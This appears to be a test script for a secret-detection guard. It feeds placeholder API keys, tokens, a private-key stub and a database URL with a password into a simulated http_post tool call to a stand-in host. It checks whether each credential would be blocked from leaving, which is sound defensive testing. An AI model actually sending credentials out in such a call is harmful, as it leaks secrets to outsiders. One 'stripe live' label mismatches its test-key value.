"""Which secret types are caught when they ride out in a tool argument.

Two rows are marked "by design" and are expected not to match: a bare unlabelled
40-character value, which cannot be told apart from a hash or a base64 blob
without an anchor, and a string that does not look like a credential at all.
Registering the latter with `guard.secrets.register` blocks it.
"""

from __future__ import annotations

from unplug import Guard
from unplug.models import Action

SECRETS: dict[str, str] = {
    "openai sk-proj": "sk-proj-abcdefghijklmnopqrstuvwxyz1234567890ABCD",
    "openai legacy sk-": "sk-abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGH",
    "github classic pat": "ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8",
    "github fine-grained": (
        "github_pat_11ABCDE0Y0aBcDeFgHiJkL_mNoPqRsTuVwXyZ0123456789abcdefghijKLMNOP"
    ),
    "aws access key id": "AKIAIOSFODNN7EXAMPLE",
    "aws secret, labelled": "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "aws secret, unlabelled (by design)": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "slack bot": "xoxb-EXAMPLE-NOT-A-REAL-TOKEN-000000000000",
    "stripe live": "sk_test_51EXAMPLENOTAREALKEY0123456789",
    "google api": "AIzaSyA1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q",
    "anthropic": "sk-ant-api03-AbCdEfGhIjKlMnOpQrStUvWxYz0123456789-AbCdEfGh",
    "jwt": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r",
    "private key": (
        "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA\n-----END RSA PRIVATE KEY-----"
    ),
    "postgres url": "postgres://svc:R3alP4ss@prod-db.internal:5432/billing",
    "fake key, not real-shaped (by design)": "sk-demo-leak-1234",
}


if __name__ == "__main__":
    print(f"{'secret type':40}{'action':>8}{'risk':>7}  findings")
    caught = 0
    for label, value in SECRETS.items():
        result = Guard().check_tool_call("http_post", {"url": "https://e.example", "data": value})
        caught += result.action is not Action.ALLOW
        subs = [f.subcategory for f in result.findings]
        print(f"{label:40}{result.action!s:>8}{result.risk_score:7.2f}  {subs}")
    print(f"\ncaught {caught}/{len(SECRETS)}")
